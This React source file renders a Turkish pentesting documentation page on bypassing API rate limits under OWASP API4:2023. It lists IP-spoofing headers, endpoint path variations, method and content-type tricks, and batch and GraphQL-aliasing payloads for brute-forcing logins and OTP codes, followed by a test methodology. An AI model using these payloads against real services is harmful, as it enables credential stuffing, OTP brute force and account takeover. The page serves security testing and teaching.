"use client"

import { motion } from "framer-motion"
import { Server, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "ip-rotation", title: "IP Rotation Headers", level: 2 },
  { id: "endpoint-variation", title: "Endpoint Variation", level: 2 },
  { id: "request-manipulation", title: "Request Manipulation", level: 2 },
  { id: "batch-abuse", title: "Batch / Array Abuse", level: 2 },
]

const fadeIn = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.4 }
}

const stagger = {
  animate: {
    transition: {
      staggerChildren: 0.1
    }
  }
}

export default function RateLimitingPage() {
  return (
    <div className="relative">
      <TableOfContents items={tocItems} />
      <motion.article
        className="prose prose-invert max-w-none"
        initial="initial"
        animate="animate"
        variants={stagger}
      >
        <motion.div variants={fadeIn} className="mb-8">
          <div className="flex items-center gap-2 text-green-400 text-sm font-medium mb-4">
            <Server className="w-4 h-4" />
            <span>API Zafiyetleri</span>
          </div>
          <h1 className="text-4xl font-bold text-foreground mb-4">Rate Limiting Bypass</h1>
          <p className="text-lg text-muted-foreground leading-relaxed">
            API rate limiting mekanizmalarını atlatma teknikleri. OWASP API4:2023 - Unrestricted Resource Consumption.
            Brute force, DoS ve data scraping için kullanılır.
          </p>
        </motion.div>

        <Callout type="info" title="OWASP API4:2023">
          Rate limiting yokluğu brute force, credential stuffing ve resource exhaustion
          saldırılarına kapı açar.
        </Callout>

        <motion.section variants={fadeIn} id="ip-rotation" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-blue-500/10 text-blue-400 text-sm font-mono">01</span>
            IP Rotation Headers
          </h2>
          <PayloadList
            title="IP Spoofing Headers"
            initialShow={10}
            payloads={[
              { code: `X-Forwarded-For: 127.0.0.1`, note: "En yaygın" },
              { code: `X-Forwarded-For: 10.0.0.FUZZ`, note: "Her request farklı IP" },
              { code: `X-Real-IP: 127.0.0.1` },
              { code: `X-Originating-IP: 127.0.0.1` },
              { code: `X-Client-IP: 127.0.0.1` },
              { code: `X-Remote-IP: 127.0.0.1` },
              { code: `X-Remote-Addr: 127.0.0.1` },
              { code: `X-Cluster-Client-IP: 127.0.0.1` },
              { code: `True-Client-IP: 127.0.0.1`, note: "Akamai" },
              { code: `CF-Connecting-IP: 127.0.0.1`, note: "Cloudflare" },
              { code: `Fastly-Client-IP: 127.0.0.1`, note: "Fastly" },
              { code: `X-Azure-ClientIP: 127.0.0.1`, note: "Azure" },
              { code: `X-Forwarded-For: 127.0.0.1, 192.168.1.1`, note: "Multiple IPs" },
              { code: `Forwarded: for=127.0.0.1`, note: "RFC 7239" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="endpoint-variation" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-red-500/10 text-red-400 text-sm font-mono">02</span>
            Endpoint Variation
          </h2>
          <PayloadList
            title="Endpoint Bypass"
            initialShow={8}
            payloads={[
              { code: `/api/login → /api/Login`, note: "Case variation" },
              { code: `/api/login → /api/login/`, note: "Trailing slash" },
              { code: `/api/login → /api//login`, note: "Double slash" },
              { code: `/api/login → /api/login?x=1`, note: "Random query param" },
              { code: `/api/login → /api/login#fragment`, note: "Fragment" },
              { code: `/api/login → /api/v1/login vs /api/v2/login`, note: "Version variation" },
              { code: `/api/login → /api/login%00`, note: "Null byte" },
              { code: `/api/login → /api/login%20`, note: "Space encoding" },
              { code: `/api/login → /api/./login`, note: "Dot notation" },
              { code: `/api/login → /%61%70%69/login`, note: "Path encoding" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="request-manipulation" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-yellow-500/10 text-yellow-400 text-sm font-mono">03</span>
            Request Manipulation
          </h2>
          <PayloadList
            title="Request Bypass"
            initialShow={8}
            payloads={[
              { code: `POST → PUT`, note: "HTTP method değiştirme" },
              { code: `POST → PATCH` },
              { code: `Content-Type: application/json → application/x-www-form-urlencoded`, note: "Content type değiştirme" },
              { code: `Content-Type: application/json → multipart/form-data` },
              { code: `{"email":"a@b.com"} → {"email":["a@b.com"]}`, note: "Array wrapping" },
              { code: `{"email":"a@b.com"} → {"email":"a@b.com","email":"a@b.com"}`, note: "Duplicate key" },
              { code: `Unicode normalization: ℀ → a/c`, note: "Unicode karakterler" },
              { code: `{"email":"a@b.com\\u0000"}`, note: "Null byte in JSON" },
              { code: `Concurrent requests (race condition)`, note: "Paralel istek gönderme" },
              { code: `Cookie rotation per request`, note: "Her istek farklı session" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="batch-abuse" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-purple-500/10 text-purple-400 text-sm font-mono">04</span>
            Batch / Array Abuse
          </h2>
          <PayloadList
            title="Batch Request Payloads"
            initialShow={6}
            payloads={[
              { code: `POST /api/login [{"user":"a","pass":"1"},{"user":"a","pass":"2"},...]`, note: "JSON array - tek request çok deneme" },
              { code: `POST /api/check-email {"emails":["a@b.com","c@d.com",...]}`, note: "Array parameter abuse" },
              { code: `POST /graphql [{"query":"..."}, {"query":"..."}, ...]`, note: "GraphQL batching" },
              { code: `POST /graphql {"query":"alias1: login(...) alias2: login(...)"}`, note: "GraphQL aliasing" },
              { code: `POST /api/otp/verify {"code":"000000-999999"}`, note: "Wildcard OTP (bazı impl)" },
              { code: `POST /api/otp/verify {"code":["0000","0001","0002",...]}`, note: "Array OTP brute force" },
            ]}
          />
        </motion.section>

        <Callout type="tip" title="Test Metodolojisi">
          1. Normal rate limit&apos;i tespit edin (kaç istek, kaç saniye){"\n"}
          2. IP rotation header&apos;ları deneyin{"\n"}
          3. Endpoint variation ile bypass deneyin{"\n"}
          4. HTTP method ve content-type değiştirin{"\n"}
          5. Batch/array request ile çoklu deneme yapın{"\n"}
          6. Race condition ile paralel istek gönderin
        </Callout>

        <motion.div variants={fadeIn} className="mt-16 pt-8 border-t border-border/50">
          <div className="flex justify-between items-center">
            <Link
              href="/docs/api/mass-assignment"
              className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors text-sm"
            >
              <ArrowLeft className="w-4 h-4" />
              Mass Assignment
            </Link>
            <Link
              href="/docs/api/graphql"
              className="text-primary hover:text-primary/80 transition-colors text-sm flex items-center gap-2"
            >
              GraphQL
              <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        </motion.div>
      </motion.article>
    </div>
  )
}
